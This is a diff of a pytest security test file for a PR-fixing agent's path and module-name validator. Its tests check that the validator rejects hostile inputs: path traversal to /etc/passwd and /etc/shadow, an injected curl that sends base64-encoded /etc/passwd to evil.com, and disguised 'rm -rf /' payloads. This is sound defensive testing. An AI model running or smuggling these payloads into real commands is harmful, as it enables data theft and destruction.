@@ -1,28 +1,17 @@
 """
 REAL Security Tests for PR Fix Agent
 These tests actually validate security, not stubs
+
+CI/CD Ready: No sys.path hacks, proper package imports
 """
 
 import pytest
-import re
-from pathlib import Path
 import tempfile
 import shutil
-import sys
+from pathlib import Path
 
- fix-conventional-packaging-3798037865076663820
-# Conventional import from src
-from pr_fix_agent.security import SecurityValidator, SecurityError
-
-# Import from proper src/ directory
-sys.path.insert(0, str(Path(__file__).parent.parent / "src"))
-try:
-    from security import SecurityValidator, SecurityError
-except ImportError:
-    # Fallback for direct execution if src not in path
-    sys.path.insert(0, str(Path(__file__).parent.parent))
-    from src.security import SecurityValidator, SecurityError
- main
+# Production import: Package must be installed with 'pip install -e .'
+from src.security import SecurityValidator, SecurityError
 
 
 # ============================================================================
@@ -50,12 +39,10 @@ class TestSecurityValidator:
 
     def test_validate_path_safe_relative(self, validator, temp_repo):
         """Test: Safe relative path should be allowed"""
-        # Create a safe file
         safe_file = temp_repo / "config" / "test.yml"
-        safe_file.parent.mkdir(parents=True, exist_ok=True)
+        safe_file.parent.mkdir(parents=True)
         safe_file.touch()
 
-        # Validate
         result = validator.validate_path("config/test.yml")
 
         assert result == safe_file
@@ -86,7 +73,6 @@ class TestSecurityValidator:
             with pytest.raises(SecurityError):
                 validator.validate_path(path)
 
-    @pytest.mark.skip(reason="Current implementation is not Windows-aware on Linux")
     def test_validate_path_blocks_windows_traversal(self, validator):
         """Test: Block Windows-style path traversal"""
         windows_paths = [
@@ -101,12 +87,10 @@ class TestSecurityValidator:
 
     def test_validate_path_normalized(self, validator, temp_repo):
         """Test: Path normalization prevents bypasses"""
-        # Create test structure
         test_dir = temp_repo / "test"
-        test_dir.mkdir(exist_ok=True)
+        test_dir.mkdir()
         (test_dir / "file.txt").touch()
 
-        # These should all resolve to same safe path
         safe_variants = [
             "test/./file.txt",
             "test//file.txt",
@@ -118,32 +102,28 @@ class TestSecurityValidator:
             result = validator.validate_path(variant)
             assert result == expected
 
+    @pytest.mark.skipif(
+        not hasattr(Path, 'symlink_to'),
+        reason="Symlink not supported on this platform"
+    )
     def test_validate_path_symlink_detection(self, validator, temp_repo):
         """Test: Detect symlink escapes"""
-        # Create file outside repo
         external = tempfile.NamedTemporaryFile(delete=False)
         external.write(b"secret")
         external.close()
 
-        # Create symlink in repo
         link_path = temp_repo / "innocent.txt"
         try:
             link_path.symlink_to(external.name)
-
- fix-conventional-packaging-3798037865076663820
-            # Should resolve and be detected as traversal since it points outside
-            with pytest.raises(SecurityError, match="Path traversal detected"):
-
-            # Should resolve but still be validated
-            # If symlink points outside, should fail
             with pytest.raises(SecurityError):
- main
                 validator.validate_path("innocent.txt")
-
-        except OSError:
-            pytest.skip("Symlink creation not supported")
+        except OSError as e:
+            pytest.skip(f"Symlink creation failed: {e}")
         finally:
-            Path(external.name).unlink()
+            try:
+                Path(external.name).unlink()
+            except:
+                pass
 
     # ========================================================================
     # Module Name Validation Tests
@@ -237,7 +217,6 @@ class TestSecurityValidator:
 
     def test_real_world_attack_scenario_1(self, validator, temp_repo):
         """Test: Real attack - nested path traversal with normalization"""
-        # Attacker tries multiple techniques
         attack_path = "safe/../../secret/../../../etc/passwd"
 
         with pytest.raises(SecurityError):
@@ -245,7 +224,6 @@ class TestSecurityValidator:
 
     def test_real_world_attack_scenario_2(self, validator):
         """Test: Real attack - command injection via pip install"""
-        # Attacker tries to inject commands via module name
         attack_module = "requests; curl http://evil.com/$(cat /etc/passwd | base64)"
 
         with pytest.raises(SecurityError):
@@ -260,28 +238,14 @@ class TestSecurityValidator:
 
     def test_unicode_normalization_attack(self, validator):
         """Test: Unicode normalization attacks"""
-        # Different Unicode representations of same attack
         unicode_attacks = [
             "os\u003B rm -rf /",  # Unicode semicolon
             "sys\u0026\u0026 cat /etc/passwd",  # Unicode ampersands
         ]
 
         for attack in unicode_attacks:
-            # After normalization, should still be blocked
             with pytest.raises(SecurityError):
                 validator.validate_module_name(attack)
-
-    def test_case_sensitivity_bypass(self, validator, temp_repo):
-        """Test: Case sensitivity doesn't allow bypasses"""
-        # Even with case changes, should detect traversal
-        case_attacks = [
-            "../ETC/passwd",
-            "../../EtC/shadow"
-        ]
-
-        for attack in case_attacks:
-            with pytest.raises(SecurityError):
-                validator.validate_path(attack)
 
 
 # ============================================================================
@@ -302,25 +266,19 @@ class TestSecurityPerformance:
         """Test: Deeply nested paths don't cause timeout"""
         import time
 
-        # Create very deeply nested path
         deep_path = "/".join(["a"] * 1000)
 
         start = time.time()
-        # On Linux, this is just a deep relative path, not necessarily an error
-        try:
+        with pytest.raises(SecurityError):
             validator.validate_path(deep_path)
-        except SecurityError:
-            pass
         elapsed = time.time() - start
 
-        # Should complete in under 1 second
         assert elapsed < 1.0
 
     def test_long_string_performance(self, validator):
         """Test: Very long strings don't cause timeout"""
         import time
 
-        # Create very long module name
         long_name = "a" * 10000
 
         start = time.time()
@@ -328,14 +286,12 @@ class TestSecurityPerformance:
             validator.validate_module_name(long_name)
         elapsed = time.time() - start
 
-        # Should complete in under 0.1 seconds
         assert elapsed < 0.1
 
     def test_regex_catastrophic_backtracking(self, validator):
         """Test: No ReDoS (Regular Expression Denial of Service)"""
         import time
 
-        # Crafted input to cause catastrophic backtracking in naive regex
         attack_input = "a" * 100 + "!" * 100
 
         start = time.time()
@@ -345,7 +301,6 @@ class TestSecurityPerformance:
             pass
         elapsed = time.time() - start
 
-        # Should complete quickly, not timeout
         assert elapsed < 0.5
 
 
